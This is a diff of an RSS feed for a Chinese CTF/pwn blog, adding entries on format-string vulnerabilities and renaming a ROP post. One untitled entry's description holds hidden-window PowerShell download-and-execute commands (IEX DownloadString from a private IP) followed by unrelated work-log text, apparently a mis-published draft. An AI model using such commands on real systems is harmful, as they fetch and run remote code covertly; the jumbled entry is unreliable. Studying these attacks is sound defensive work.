@@ -6,7 +6,16 @@
     <description>Recent content in 🏖 pwn on 果汁天下苏&#39;s Blog</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>zh-cn</language>
-    <lastBuildDate>Thu, 16 Nov 2023 17:06:06 +0800</lastBuildDate><atom:link href="http://guozhi1.github.io/posts/pwn/index.xml" rel="self" type="application/rss+xml" />
+    <lastBuildDate>Thu, 07 Dec 2023 15:35:44 +0800</lastBuildDate><atom:link href="http://guozhi1.github.io/posts/pwn/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>格式化字符串漏洞基础</title>
+      <link>http://guozhi1.github.io/posts/pwn/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/</link>
+      <pubDate>Thu, 07 Dec 2023 15:35:44 +0800</pubDate>
+      
+      <guid>http://guozhi1.github.io/posts/pwn/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/</guid>
+      <description>格式化字符串漏洞 格式化字符串漏洞是发现比较晚的漏洞，产生的原因是因为 ，格式化函数把用户输入的格式化字符，当做了解析自身的格式化字符做了解析。 常见的格式化漏洞函数 各种print函数 格式化字符 %s 打印字符串 %p 打印地址 %c 打印char字符 %n 输入字符 %10c 这代表10个制表符（空格） printf(&amp;#34;guozhi%10s&amp;#34;, &amp;#34;格</description>
+    </item>
+    
     <item>
       <title>ROP中级</title>
       <link>http://guozhi1.github.io/posts/pwn/rop%E4%B8%AD%E7%BA%A7/</link>
@@ -27,10 +36,10 @@
     
     <item>
       <title>ROP基础</title>
-      <link>http://guozhi1.github.io/posts/pwn/aaaaa/</link>
+      <link>http://guozhi1.github.io/posts/pwn/rop%E5%9F%BA%E7%A1%80/</link>
       <pubDate>Wed, 15 Nov 2023 14:59:44 +0800</pubDate>
       
-      <guid>http://guozhi1.github.io/posts/pwn/aaaaa/</guid>
+      <guid>http://guozhi1.github.io/posts/pwn/rop%E5%9F%BA%E7%A1%80/</guid>
       <description>如何利用栈溢出漏洞</description>
     </item>
     
@@ -50,6 +59,15 @@
       
       <guid>http://guozhi1.github.io/posts/pwn/%E6%A0%88%E6%BA%A2%E5%87%BA/</guid>
       <description>基础栈溢出</description>
+    </item>
+    
+    <item>
+      <title></title>
+      <link>http://guozhi1.github.io/posts/pwn/buuctfbjdctf_2020_babystack%E8%A7%A3%E9%A2%98/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>http://guozhi1.github.io/posts/pwn/buuctfbjdctf_2020_babystack%E8%A7%A3%E9%A2%98/</guid>
+      <description>echo curl -o 1.ps1 http://172.16.32.67:8000/1.ps1 &amp;gt; 1.bat 运行powershell 脚本 powershell -WindowStyle hidden -exec bypass -file 1.ps1 set scriptblock &amp;lsquo;powershell -WindowStyle Hidden -Command &amp;ldquo;IEX (New-Object Net.WebClient).DownloadString(&amp;lsquo;http://172.16.32.67:8000/1.ps1&amp;rsquo;)&amp;rdquo;&amp;rsquo; set scriptblock &amp;lsquo;powershell -WindowStyle Hidden -Command &amp;ldquo;wget &amp;ldquo;&amp;rsquo; 下载并执行 IEX (New-Object Net.WebClient).DownloadString(&amp;lsquo;http://172.16.32.67:8000/1.ps1&amp;rsquo;) 无窗口执行 powershell -WindowStyle Hidden -Command &amp;ldquo;IEX (New-Object Net.WebClient).DownloadString(&amp;lsquo;http://172.16.32.67:8000/1.ps1&amp;rsquo;)&amp;rdquo; powershell -WindowStyle Hidden -Command &amp;ldquo;IEX (New-Object Net.WebClient).DownloadString(&amp;lsquo;http://172.16.32.67:8000/1.ps1&amp;rsquo;)&amp;rdquo; 一、总体工作内容 参与中国移动安全运营建设，完成中国移动网络安全保障，进行中国移动攻防演练值守，对甲方内外网业务系统建设安全屏障。 二、今日</description>
     </item>
     
   </channel>
